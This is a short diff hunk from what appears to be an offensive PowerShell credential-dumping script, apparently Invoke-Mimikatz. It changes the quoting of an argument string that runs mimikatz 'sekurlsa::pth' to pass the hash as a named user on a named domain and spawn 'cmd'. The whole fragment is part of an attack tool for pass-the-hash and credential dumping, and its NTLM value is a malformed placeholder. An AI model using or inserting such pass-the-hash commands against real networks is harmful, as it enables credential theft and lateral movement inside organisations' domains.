@@ -2707,7 +2707,7 @@ Function Main
 
 	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
-		$ExeArgs = `"sekurlsa::pth /user:oaktree /domain:spiderlabs.local /ntlm:0123456789abcdefA /ptt cmd"`
+		$ExeArgs = "`sekurlsa::pth /user:oaktree /domain:spiderlabs.local /ntlm:0123456789abcdefA /ptt cmd`"
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
